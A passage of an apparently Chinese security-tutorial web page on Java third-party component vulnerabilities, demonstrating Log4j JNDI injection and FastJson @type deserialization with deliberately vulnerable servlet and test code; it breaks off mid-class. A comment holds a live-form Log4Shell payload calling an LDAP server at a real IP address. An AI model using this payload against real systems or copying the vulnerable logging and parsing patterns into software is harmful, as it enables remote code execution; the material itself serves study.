                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397376455900-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">toString</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">         </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="s">&#34;calc&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">IOException</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">RuntimeException</span><span class="p">(</span><span class="n">e</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="c1">//对obj对象进行输出 默认调用原始对象的toString 方法</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">obj</span><span class="p">);</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300901461.png" style="max-width: 100%; height: auto;"></p>
<h1 id="36-第三方组件maven配置jndi">36-第三方组件&amp;Maven配置&amp;JNDI<a hidden class="anchor" aria-hidden="true" href="#36-第三方组件maven配置jndi">#</a></h1>
<h2 id="jndl注入">JNDL注入：<a hidden class="anchor" aria-hidden="true" href="#jndl注入">#</a></h2>
<p><a href="https://blog.csdn.net/qq_29163073/article/details/122951307">https://blog.csdn.net/qq_29163073/article/details/122951307</a></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300900107.png" style="max-width: 100%; height: auto;"></p>
<h2 id="第三方组件-log4j">第三方组件-Log4J<a hidden class="anchor" aria-hidden="true" href="#第三方组件-log4j">#</a></h2>
<p>Log4J：控制日志的处理</p>
<div class="code-block-container" id="code-1769750397377625700" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397377625700">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397377625700" title="Toggle" aria-expanded="false" aria-controls="code-1769750397377625700" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397377625700-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span><span class="lnt" id="11"><span class="lnlinks">11</span>
</span><span class="lnt" id="12"><span class="lnlinks">12</span>
</span><span class="lnt" id="13"><span class="lnlinks">13</span>
</span><span class="lnt" id="14"><span class="lnlinks">14</span>
</span><span class="lnt" id="15"><span class="lnlinks">15</span>
</span><span class="lnt" id="16"><span class="lnlinks">16</span>
</span><span class="lnt" id="17"><span class="lnlinks">17</span>
</span><span class="lnt" id="18"><span class="lnlinks">18</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//	src/main/java/Log4jTest.java</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.logging.log4j.LogManager</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.logging.log4j.Logger</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Log4jTest</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//使用Log4j 实现错误日志输出</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">Logger</span><span class="w"> </span><span class="n">logger</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LogManager</span><span class="p">.</span><span class="na">getLogger</span><span class="p">(</span><span class="n">Log4jTest</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="c1">//        logger.error(&#34;123&#34;);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//如果这个code变量是可控的</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">code</span><span class="o">=</span><span class="s">&#34;${java:os}&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">logger</span><span class="p">.</span><span class="na">error</span><span class="p">(</span><span class="s">&#34;{}&#34;</span><span class="p">,</span><span class="n">code</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><p>输出：</p>
<div class="code-block-container" id="code-1769750397383878700" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397383878700">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">plain</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397383878700" title="Toggle" aria-expanded="false" aria-controls="code-1769750397383878700" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397383878700-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">21:05:45.593 [main] ERROR Log4jTest - Windows 10 10.0, architecture: amd64-64</span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><div class="code-block-container" id="code-1769750397383878700" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397383878700">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">plain</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397383878700" title="Toggle" aria-expanded="false" aria-controls="code-1769750397383878700" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397383878700-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span><span class="lnt" id="11"><span class="lnlinks">11</span>
</span><span class="lnt" id="12"><span class="lnlinks">12</span>
</span><span class="lnt" id="13"><span class="lnlinks">13</span>
</span><span class="lnt" id="14"><span class="lnlinks">14</span>
</span><span class="lnt" id="15"><span class="lnlinks">15</span>
</span><span class="lnt" id="16"><span class="lnlinks">16</span>
</span><span class="lnt" id="17"><span class="lnlinks">17</span>
</span><span class="lnt" id="18"><span class="lnlinks">18</span>
</span><span class="lnt" id="19"><span class="lnlinks">19</span>
</span><span class="lnt" id="20"><span class="lnlinks">20</span>
</span><span class="lnt" id="21"><span class="lnlinks">21</span>
</span><span class="lnt" id="22"><span class="lnlinks">22</span>
</span><span class="lnt" id="23"><span class="lnlinks">23</span>
</span><span class="lnt" id="24"><span class="lnlinks">24</span>
</span><span class="lnt" id="25"><span class="lnlinks">25</span>
</span><span class="lnt" id="26"><span class="lnlinks">26</span>
</span><span class="lnt" id="27"><span class="lnlinks">27</span>
</span><span class="lnt" id="28"><span class="lnlinks">28</span>
</span><span class="lnt" id="29"><span class="lnlinks">29</span>
</span><span class="lnt" id="30"><span class="lnlinks">30</span>
</span><span class="lnt" id="31"><span class="lnlinks">31</span>
</span><span class="lnt" id="32"><span class="lnlinks">32</span>
</span><span class="lnt" id="33"><span class="lnlinks">33</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">package com.example.log4jwebdemo;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">import org.apache.logging.log4j.LogManager;
</span></span><span class="line"><span class="cl">import org.apache.logging.log4j.Logger;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">import javax.servlet.ServletException;
</span></span><span class="line"><span class="cl">import javax.servlet.annotation.WebServlet;
</span></span><span class="line"><span class="cl">import javax.servlet.http.HttpServlet;
</span></span><span class="line"><span class="cl">import javax.servlet.http.HttpServletRequest;
</span></span><span class="line"><span class="cl">import javax.servlet.http.HttpServletResponse;
</span></span><span class="line"><span class="cl">import java.io.IOException;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">@WebServlet(&#34;/log4j&#34;)
</span></span><span class="line"><span class="cl">public class Log4jServlet extends HttpServlet {
</span></span><span class="line"><span class="cl">    //构造HTTP Web服务 使用带漏洞Log4j版本 实现功能
</span></span><span class="line"><span class="cl">    private static final Logger log= LogManager.getLogger(Log4jServlet.class);
</span></span><span class="line"><span class="cl">    @Override
</span></span><span class="line"><span class="cl">    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
</span></span><span class="line"><span class="cl">        String code =req.getParameter(&#34;code&#34;);
</span></span><span class="line"><span class="cl">        //code=$(java:os) 输出执行结果
</span></span><span class="line"><span class="cl">        //code=(java:os) 正常输入
</span></span><span class="line"><span class="cl">        //${jndi:ldap://47.94.236.117:1389/uyhyw6}
</span></span><span class="line"><span class="cl">        //${jndi:ldap://xxxx.dns.log}
</span></span><span class="line"><span class="cl">        //ldap://47.94.236.117:1389/uyhyw6 生成的远程可访问的调用方法
</span></span><span class="line"><span class="cl">        //什么方法？ -A &#34;calc&#34; 执行计算机的功能方法（JNDI注入工具生成的）
</span></span><span class="line"><span class="cl">        log.error(&#34;{}&#34;,code);
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        //1、开发源码中引用漏洞组件如log4j
</span></span><span class="line"><span class="cl">        //2、开发中使用组件的代码（触发漏洞代码）
</span></span><span class="line"><span class="cl">        //3、可控变量去传递Payload来实现攻击
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">}</span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><h2 id="第三方组件-fastjson">第三方组件-FastJson<a hidden class="anchor" aria-hidden="true" href="#第三方组件-fastjson">#</a></h2>
<p><a href="https://mvnrepository.com/">https://mvnrepository.com/</a></p>
<p>FastJson:将 Java 对象转换为 JSON 格式，当然它也可以将 JSON 字符串转换为 Java 对象。</p>
<p><a href="https://www.runoob.com/w3cnote/fastjson-intro.html">https://www.runoob.com/w3cnote/fastjson-intro.html</a></p>
<p><a href="https://blog.csdn.net/qq_40205116/article/details/102865704">https://blog.csdn.net/qq_40205116/article/details/102865704</a></p>
<div class="code-block-container" id="code-1769750397384952600" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397384952600">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397384952600" title="Toggle" aria-expanded="false" aria-controls="code-1769750397384952600" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397384952600-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span><span class="lnt" id="11"><span class="lnlinks">11</span>
</span><span class="lnt" id="12"><span class="lnlinks">12</span>
</span><span class="lnt" id="13"><span class="lnlinks">13</span>
</span><span class="lnt" id="14"><span class="lnlinks">14</span>
</span><span class="lnt" id="15"><span class="lnlinks">15</span>
</span><span class="lnt" id="16"><span class="lnlinks">16</span>
</span><span class="lnt" id="17"><span class="lnlinks">17</span>
</span><span class="lnt" id="18"><span class="lnlinks">18</span>
</span><span class="lnt" id="19"><span class="lnlinks">19</span>
</span><span class="lnt" id="20"><span class="lnlinks">20</span>
</span><span class="lnt" id="21"><span class="lnlinks">21</span>
</span><span class="lnt" id="22"><span class="lnlinks">22</span>
</span><span class="lnt" id="23"><span class="lnlinks">23</span>
</span><span class="lnt" id="24"><span class="lnlinks">24</span>
</span><span class="lnt" id="25"><span class="lnlinks">25</span>
</span><span class="lnt" id="26"><span class="lnlinks">26</span>
</span><span class="lnt" id="27"><span class="lnlinks">27</span>
</span><span class="lnt" id="28"><span class="lnlinks">28</span>
</span><span class="lnt" id="29"><span class="lnlinks">29</span>
</span><span class="lnt" id="30"><span class="lnlinks">30</span>
</span><span class="lnt" id="31"><span class="lnlinks">31</span>
</span><span class="lnt" id="32"><span class="lnlinks">32</span>
</span><span class="lnt" id="33"><span class="lnlinks">33</span>
</span><span class="lnt" id="34"><span class="lnlinks">34</span>
</span><span class="lnt" id="35"><span class="lnlinks">35</span>
</span><span class="lnt" id="36"><span class="lnlinks">36</span>
</span><span class="lnt" id="37"><span class="lnlinks">37</span>
</span><span class="lnt" id="38"><span class="lnlinks">38</span>
</span><span class="lnt" id="39"><span class="lnlinks">39</span>
</span><span class="lnt" id="40"><span class="lnlinks">40</span>
</span><span class="lnt" id="41"><span class="lnlinks">41</span>
</span><span class="lnt" id="42"><span class="lnlinks">42</span>
</span><span class="lnt" id="43"><span class="lnlinks">43</span>
</span><span class="lnt" id="44"><span class="lnlinks">44</span>
</span><span class="lnt" id="45"><span class="lnlinks">45</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//	FastjsonTest.java</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.xiaodi</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSON</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSONObject</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.serializer.SerializerFeature</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="c1">//使用fastjson去处理User类数据</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">FastjsonTest</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//u Object对象</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//Integer age String name 字符串数据</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">User</span><span class="w"> </span><span class="n">u</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">User</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">u</span><span class="p">.</span><span class="na">setAge</span><span class="p">(</span><span class="n">30</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">u</span><span class="p">.</span><span class="na">setName</span><span class="p">(</span><span class="s">&#34;xiaodi&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//System.out.println(u);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//我们想把数据转换成Json格式数据，我不想用自带的API（太麻烦）</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//我就选择第三方组件fastjson来去做这个功能</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//讲json对象转换json数据</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="c1">//        String jsonString = JSONObject.toJSONString(u);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="c1">//        System.out.println(&#34;这就是json格式：&#34;+jsonString);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">       </span><span class="c1">//分析漏洞利用 多输出 转换数据的类型（类） 告诉大家其实前面有一个@type 转换对象类包</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="c1">//        String jsonString1 = JSONObject.toJSONString(u, SerializerFeature.WriteClassName);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="c1">//        System.out.println(jsonString1);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//上述对象 -&gt; JSON</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//下面JSON -&gt; 对象</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//String test = &#34;{\&#34;@type\&#34;:\&#34;com.xiaodi.User\&#34;,\&#34;age\&#34;:30,\&#34;name\&#34;:\&#34;xiaodi\&#34;}&#34;;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">test</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;{\&#34;@type\&#34;:\&#34;com.xiaodi.Run\&#34;,\&#34;age\&#34;:30,\&#34;name\&#34;:\&#34;xiaodi\&#34;}&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//实战中com.xiaodi.Run 我们不知道 固定调用</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//rmi ldap 去触发远程的class 执行代码（RCE）</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">JSONObject</span><span class="w"> </span><span class="n">jsonObject</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">JSON</span><span class="p">.</span><span class="na">parseObject</span><span class="p">(</span><span class="n">test</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">jsonObject</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><div class="code-block-container" id="code-1769750397389280900" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397389280900">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397389280900" title="Toggle" aria-expanded="false" aria-controls="code-1769750397389280900" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397389280900-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">// Run.java</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.xiaodi</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.IOException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Run</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="nf">Run</span><span class="p">()</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
